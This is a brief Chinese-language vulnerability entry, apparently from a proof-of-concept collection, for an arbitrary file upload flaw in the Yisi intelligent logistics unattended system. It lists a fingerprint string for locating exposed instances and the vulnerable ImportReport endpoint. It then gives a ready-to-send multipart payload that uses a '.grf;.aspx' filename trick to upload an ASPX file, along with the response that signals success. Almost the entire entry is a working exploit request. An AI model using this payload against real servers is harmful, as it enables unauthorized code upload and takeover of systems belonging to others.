# 易思智能物流无人值守系统ImportReport存在任意文件上传漏洞

易思智能物流无人值守系统 ｜ 文件上传 ｜ —
- **指纹**：`"智能物流无人值守系统"`
- **请求**：`POST /Sys_ReportFile/ImportReport?encode=717132 HTTP/1.1`

**Payload**
```
--59d3d0b126080d21572c9e7a77d89931
Content-Disposition: form-data; name="file"; filename="1234.grf;.aspx"
Content-Type: application/octet-stream
304674859
--59d3d0b126080d21572c9e7a77d89931--
```
- **响应特征**：200 xxxx.aspx